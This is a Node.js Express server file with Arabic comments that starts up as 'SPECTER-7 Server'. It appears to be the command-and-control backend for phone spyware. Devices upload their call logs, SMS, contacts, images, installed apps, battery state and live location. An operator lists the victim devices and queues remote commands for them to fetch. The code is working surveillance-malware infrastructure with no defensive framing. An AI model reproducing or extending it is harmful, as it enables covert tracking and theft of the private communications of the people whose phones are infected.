const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '200mb' }));
app.use(express.static('public'));

// إنشاء مجلد البيانات
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}

const devicesFile = path.join(dataDir, 'devices.json');
if (!fs.existsSync(devicesFile)) {
    fs.writeFileSync(devicesFile, '[]');
}

// ============ استقبال البيانات ============
app.post('/upload.php', (req, res) => {
    try {
        const data = req.body;
        const deviceId = data.device_id || 'unknown';
        
        const deviceDir = path.join(dataDir, deviceId);
        if (!fs.existsSync(deviceDir)) {
            fs.mkdirSync(deviceDir, { recursive: true });
            fs.mkdirSync(path.join(deviceDir, 'files'), { recursive: true });
        }
        
        const dataFilePath = path.join(deviceDir, 'data.json');
        let existingData = {};
        if (fs.existsSync(dataFilePath)) {
            existingData = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
        }
        
        if (data.type === 'all' && data.data) {
            existingData = { ...existingData, ...data.data };
        } else if (data.data) {
            existingData[data.type] = data.data;
        }
        
        fs.writeFileSync(dataFilePath, JSON.stringify(existingData, null, 2));
        
        updateDevicesList(deviceId);
        
        res.json({ success: true });
    } catch (e) {
        res.json({ error: e.message });
    }
});

// ============ استقبال الحالة الحية ============
app.post('/live_update.php', (req, res) => {
    try {
        const data = req.body;
        const deviceId = data.device_id || 'unknown';
        
        const deviceDir = path.join(dataDir, deviceId);
        if (!fs.existsSync(deviceDir)) {
            fs.mkdirSync(deviceDir, { recursive: true });
        }
        
        const liveFile = path.join(deviceDir, 'live.json');
        let live = {};
        if (fs.existsSync(liveFile)) {
            live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
        }
        
        live.network = data.network || 'متصل';
        live.battery = data.battery || null;
        live.location = data.location || null;
        live.last_seen = data.last_seen || Math.floor(Date.now() / 1000);
        
        fs.writeFileSync(liveFile, JSON.stringify(live, null, 2));
        
        updateDevicesList(deviceId);
        
        res.json({ success: true });
    } catch (e) {
        res.json({ error: e.message });
    }
});

// ============ الحصول على البيانات الحية ============
app.get('/live.php', (req, res) => {
    try {
        const deviceId = req.query.device;
        
        if (!deviceId) {
            return res.json({ error: 'Device ID required' });
        }
        
        const liveFile = path.join(dataDir, deviceId, 'live.json');
        const dataFile = path.join(dataDir, deviceId, 'data.json');
        
        let response = {
            online: false,
            network: 'غير متصل',
            battery: null,
            location: null,
            last_seen: 0,
            seconds_ago: 999999
        };
        
        if (fs.existsSync(liveFile)) {
            const live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
            const lastSeen = live.last_seen || 0;
            
            response = {
                online: (Math.floor(Date.now() / 1000) - lastSeen) < 30,
                network: live.network || 'غير معروف',
                battery: live.battery || null,
                location: live.location || null,
                last_seen: lastSeen,
                seconds_ago: Math.floor(Date.now() / 1000) - lastSeen
            };
        }
        
        if (fs.existsSync(dataFile)) {
            const allData = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
            response.call_count = (allData.call_logs || []).length;
            response.sms_count = (allData.sms || []).length;
            response.contacts_count = (allData.contacts || []).length;
            response.images_count = (allData.images || []).length;
            response.apps_count = (allData.installed_apps || []).length;
        }
        
        res.json(response);
    } catch (e) {
        res.json({ error: e.message });
    }
});

// ============ API Routes ============
app.get('/api.php', (req, res) => {
    try {
        const action = req.query.action;
        const deviceId = req.query.device;
        const type = req.query.type;
        
        // حذف جهاز
        if (action === 'delete_device') {
            if (!deviceId) {
                return res.json({ error: 'Device ID required' });
            }
            
            const deviceDir = path.join(dataDir, deviceId);
            if (fs.existsSync(deviceDir)) {
                fs.rmSync(deviceDir, { recursive: true, force: true });
            }
            
            let devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
            devices = devices.filter(d => d.id !== deviceId);
            fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
            
            return res.json({ success: true });
        }
        
        // الحصول على بيانات محددة
        if (action === 'get_data') {
            const dataFile = path.join(dataDir, deviceId, 'data.json');
            if (fs.existsSync(dataFile)) {
                const allData = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
                if (type && type !== 'all' && allData[type]) {
                    res.json(allData[type]);
                } else {
                    res.json(allData);
                }
            } else {
                res.json([]);
            }
        } 
        // الحصول على الحالة الحية
        else if (action === 'get_live') {
            const liveFile = path.join(dataDir, deviceId, 'live.json');
            if (fs.existsSync(liveFile)) {
                res.json(JSON.parse(fs.readFileSync(liveFile, 'utf8')));
            } else {
                res.json({});
            }
        } 
        // الحصول على الأوامر
        else if (action === 'get_commands') {
            const commandsFile = path.join(dataDir, deviceId, 'commands.json');
            if (fs.existsSync(commandsFile)) {
                const commands = JSON.parse(fs.readFileSync(commandsFile, 'utf8'));
                fs.writeFileSync(commandsFile, '[]');
                res.json({ commands });
            } else {
                res.json({ commands: [] });
            }
        } 
        else {
            res.json({ error: 'Invalid action' });
        }
    } catch (e) {
        res.json({ error: e.message });
    }
});

// ============ إرسال أمر ============
app.post('/api.php', (req, res) => {
    try {
        const { device, command } = req.body;
        
        if (!device || !command) {
            return res.json({ error: 'Device and command required' });
        }
        
        const deviceDir = path.join(dataDir, device);
        if (!fs.existsSync(deviceDir)) {
            fs.mkdirSync(deviceDir, { recursive: true });
        }
        
        const commandsFile = path.join(deviceDir, 'commands.json');
        let commands = [];
        if (fs.existsSync(commandsFile)) {
            commands = JSON.parse(fs.readFileSync(commandsFile, 'utf8'));
        }
        
        commands.push({
            command,
            timestamp: Math.floor(Date.now() / 1000),
            status: 'pending'
        });
        
        fs.writeFileSync(commandsFile, JSON.stringify(commands));
        
        res.json({ success: true });
    } catch (e) {
        res.json({ error: e.message });
    }
});

// ============ قائمة الأجهزة ============
app.get('/devices.json', (req, res) => {
    try {
        const devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
        res.json(devices);
    } catch (e) {
        res.json([]);
    }
});

// ============ Helper Functions ============
function updateDevicesList(deviceId) {
    let devices = [];
    if (fs.existsSync(devicesFile)) {
        devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
    }
    
    const index = devices.findIndex(d => d.id === deviceId);
    if (index >= 0) {
        devices[index].last_seen = Math.floor(Date.now() / 1000);
    } else {
        devices.push({
            id: deviceId,
            first_seen: Math.floor(Date.now() / 1000),
            last_seen: Math.floor(Date.now() / 1000)
        });
    }
    
    fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
}

// ============ Start Server ============
app.listen(PORT, () => {
    console.log(`SPECTER-7 Server running on port ${PORT}`);
});
